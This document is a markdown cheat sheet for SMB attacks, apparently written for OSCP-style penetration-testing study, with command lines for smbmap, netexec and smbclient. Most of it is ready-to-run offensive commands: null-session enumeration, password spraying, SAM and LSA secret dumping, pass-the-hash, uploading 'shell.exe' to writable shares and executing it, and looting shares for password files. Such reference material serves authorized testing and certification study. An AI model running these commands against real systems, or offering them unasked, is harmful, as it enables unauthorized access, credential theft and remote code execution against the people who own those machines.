# SMB ENUMERATION & EXPLOITATION CHEATSHEET (OSCP-STYLE)

Tools Covered:

* smbmap
* netexec (nxc / crackmapexec successor)
* smbclient

---

## Table of Contents

1. SMB Basics
2. smbmap Cheat Sheet
3. netexec Cheat Sheet
4. smbclient Cheat Sheet
5. Common Attack Workflows
6. Credential Testing Strategies
7. File Transfer & Looting
8. Common Pitfalls

---

## 1. SMB Basics

### Default Ports

```text
139 (NetBIOS)
445 (SMB)
```

### Common Goals

* Enumerate shares
* Identify readable/writable shares
* Extract credentials
* Upload payloads
* Execute commands (if possible)

---

## 2. smbmap Cheat Sheet

### Basic Enumeration

```bash
smbmap -H <IP>
```

### With Credentials

```bash
smbmap -H <IP> -u user -p pass
smbmap -H <IP> -u user -p pass -d domain
```

### Null Session

```bash
smbmap -H <IP> -u '' -p ''
```

### List Shares + Permissions

```bash
smbmap -H <IP>
```

Output:

```text
READ
WRITE
NO ACCESS
```

### Recursive Listing

```bash
smbmap -H <IP> -r <share>
```

### Download File

```bash
smbmap -H <IP> -r <share> --download <file>
```

### Upload File

```bash
smbmap -H <IP> --upload local.txt share/remote.txt
```

### Search for Sensitive Files

```bash
smbmap -H <IP> -r <share> -A "password"
```

### Execute Command (if allowed)

```bash
smbmap -H <IP> -u user -p pass -x "whoami"
```

---

## 3. netexec (nxc) Cheat Sheet

### Basic Scan

```bash
nxc smb <IP>
```

### Authenticate

```bash
nxc smb <IP> -u user -p pass
```

### Password Spray

```bash
nxc smb <IP> -u users.txt -p password
```

### Credential Spray

```bash
nxc smb <IP> -u users.txt -p passwords.txt
```

### Check Admin Access

```bash
nxc smb <IP> -u user -p pass --admin
```

### Enumerate Shares

```bash
nxc smb <IP> -u user -p pass --shares
```

### Dump SAM

```bash
nxc smb <IP> -u user -p pass --sam
```

### Dump LSASS

```bash
nxc smb <IP> -u user -p pass --lsa
```

### Execute Command

```bash
nxc smb <IP> -u user -p pass -x "whoami"
```

### Upload File

```bash
nxc smb <IP> -u user -p pass --put-file local.exe remote.exe
```

### Download File

```bash
nxc smb <IP> -u user -p pass --get-file remote.txt local.txt
```

### Pass-the-Hash

```bash
nxc smb <IP> -u user -H <NTLM_HASH>
```

---

## 4. smbclient Cheat Sheet

### List Shares

```bash
smbclient -L //<IP> -N
smbclient -L //<IP> -U user
```

### Connect to Share

```bash
smbclient //<IP>/<share>
```

### Anonymous Login

```bash
smbclient //<IP>/<share> -N
```

### With Credentials

```bash
smbclient //<IP>/<share> -U user
```

### Common Commands (inside smbclient)

```text
ls
cd
pwd
get file.txt
put file.txt
mget *
mput *
```

### Recursive Download

```text
recurse ON
prompt OFF
mget *
```

### Upload File

```text
put shell.exe
```

---

## 5. Common Attack Workflows

### 1. Anonymous Enumeration

```bash
smbmap -H <IP>
smbclient -L //<IP> -N
```

### 2. Password Spray

```bash
nxc smb <IP> -u users.txt -p passwords.txt
```

### 3. Share Enumeration

```bash
nxc smb <IP> --shares
smbmap -H <IP>
```

### 4. Find Writable Share

```bash
smbmap -H <IP>
```

### 5. Upload Payload

```bash
smbmap --upload shell.exe share/shell.exe
```

### 6. Execute Payload

```bash
nxc smb <IP> -x "shell.exe"
```

---

## 6. Credential Testing Strategies

* Null sessions first
* Username enumeration
* Password spraying (avoid lockout)
* Reuse credentials across hosts

---

## 7. File Transfer & Looting

### Search for:

* config files
* backup files
* passwords
* scripts

```bash
smbmap -A "password"
```

---

## 8. Common Pitfalls

* SMB signing enabled → restricts attacks
* Account lockouts
* Wrong domain usage
* Case-sensitive usernames in some environments

---

## Key Tip

> Always combine smbmap + netexec + smbclient for full coverage.

* smbmap → quick share perms
* netexec → auth + exploitation
* smbclient → manual interaction
